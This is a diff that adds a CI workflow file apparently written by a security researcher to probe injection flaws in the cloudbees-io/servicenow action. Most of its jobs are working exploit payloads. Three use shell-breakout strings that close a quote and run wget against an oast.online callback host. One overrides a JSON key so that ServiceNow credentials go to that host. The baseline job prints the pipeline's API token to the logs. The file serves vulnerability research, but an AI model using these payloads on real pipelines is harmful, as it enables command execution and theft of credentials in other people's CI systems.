@@ -1,0 +1,114 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: diag-injection-viability
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+jobs:
+
+  # ─── BASELINE ────────────────────────────────────────────────────────────────
+  # No injection. Proves (a) the container has egress to oast.online,
+  # (b) cloudbees.api.token is populated in the action's env,
+  # (c) OAST callback path works. If BASELINE doesn't hit, nothing else will either.
+  baseline:
+    steps:
+      - name: baseline
+        uses: docker://alpine:latest
+        env:
+          JWT_TOKEN: ${{ cloudbees.api.token }}
+          RUN_ID:    ${{ cloudbees.run_id }}
+          OAST_HOST: d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online
+        shell: sh
+        run: |
+          set +x
+          echo "== egress + JWT baseline =="
+          which curl wget busybox 2>&1
+          apk add --no-cache curl >/dev/null 2>&1 || true
+          which curl wget busybox 2>&1
+          echo "JWT length: ${#JWT_TOKEN}"
+          echo "RUN_ID:     $RUN_ID"
+          # In-tenant only: print JWT to runner logs (the researcher's own tenant sees this)
+          echo "TOKEN(logs-only): $JWT_TOKEN"
+          # OAST callback carries only length + run id, never the token itself
+          HASH="$(printf '%s' "$JWT_TOKEN" | sha256sum | cut -c1-16)"
+          for tool in "wget -qO- --tries=1 --timeout=8" "curl -sS --max-time 8" ; do
+            printf 'trying: %s\n' "$tool"
+            $tool "https://${OAST_HOST}/BASELINE?run=${RUN_ID}&jwtlen=${#JWT_TOKEN}&h=${HASH}" && echo "  ok" || echo "  FAIL"
+          done
+
+  # ─── SIG-A — JSON injection through additional-parameters ────────────────────
+  # Unquoted-in-JSON string field. If parseable, the Go binary handles it.
+  # This is the researcher's already-known-working variant.
+  sig_a_addparam_json:
+    steps:
+      - name: sn-addparam-json
+        uses: cloudbees-io/servicenow@v1
+        with:
+          action-type: 'create_change'
+          url: 'https://example.service-now.com'
+          username: 'diag'
+          password: 'x'
+          cr-number: 'CR-A'
+          additional-parameters: '{"diag_marker":"SIG_A_JSON_INJECT_LANDED"}'
+
+  # ─── SIG-B — shell breakout via apostrophe in a JSON-string input ────────────
+  # username field is JSON-string-wrapped in the template.
+  # Payload: close the outer shell single-quote → run wget → reopen.
+  sig_b_username_apostrophe:
+    steps:
+      - name: sn-username-apostrophe
+        uses: cloudbees-io/servicenow@v1
+        with:
+          action-type: 'create_change'
+          url: 'https://example.service-now.com'
+          username: "x'; wget -qO- --tries=1 --timeout=6 \"https://d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online/SIG_B_USERNAME_APOSTROPHE?jwtlen=${#JWT_TOKEN}\" ; :'"
+          password: 'x'
+          cr-number: 'CR-B'
+
+  # ─── SIG-C — shell breakout via apostrophe in an UNQUOTED numeric field ──────
+  # validate-blackout-window-conflict is spliced without JSON quotes (line 109 of servicenow action.yml).
+  # If the runner escapes apostrophes only in string inputs, this might slip through.
+  sig_c_blackout_apostrophe:
+    steps:
+      - name: sn-blackout-apostrophe
+        uses: cloudbees-io/servicenow@v1
+        with:
+          action-type: 'create_change'
+          url: 'https://example.service-now.com'
+          username: 'diag'
+          password: 'x'
+          cr-number: 'CR-C'
+          validate-blackout-window-conflict: "true'; wget -qO- --tries=1 --timeout=6 \"https://d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online/SIG_C_BLACKOUT_APOSTROPHE?jwtlen=${#JWT_TOKEN}\" ; :'"
+
+  # ─── SIG-D — shell breakout via unquoted additional-parameters ───────────────
+  # `additional_parameters` field is placed with NO surrounding quotes (line 129).
+  # Payload: valid JSON `{}` then close outer shell quote, run wget, reopen.
+  sig_d_addparam_shell:
+    steps:
+      - name: sn-addparam-shell
+        uses: cloudbees-io/servicenow@v1
+        with:
+          action-type: 'create_change'
+          url: 'https://example.service-now.com'
+          username: 'diag'
+          password: 'x'
+          cr-number: 'CR-D'
+          additional-parameters: "{}'; wget -qO- --tries=1 --timeout=6 \"https://d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online/SIG_D_ADDPARAM_SHELL?jwtlen=${#JWT_TOKEN}\" ; :'"
+
+  # ─── SIG-E — JSON key OVERRIDE via additional-parameters (attacker owns URL) ─
+  # No shell injection. Just re-declare `url` after the servicenow struct is closed.
+  # Go's encoding/json uses last-wins → the binary calls MY OAST as if it were ServiceNow.
+  # This is the cleanest data-plane proof that the JSON injection is exploitable at the
+  # application layer — no shell required.
+  sig_e_addparam_url_override:
+    steps:
+      - name: sn-url-override
+        uses: cloudbees-io/servicenow@v1
+        with:
+          action-type: 'create_change'
+          url: 'https://real.service-now.com'
+          username: 'REAL_SERVICENOW_USER'
+          password: 'REAL_SERVICENOW_PASSWORD'
+          cr-number: 'CR-E'
+          additional-parameters: '{},"url":"https://d98bs3sjor395h053ddgt8w8dwfdmcbqw.oast.online/SIG_E_URL_OVERRIDE"'
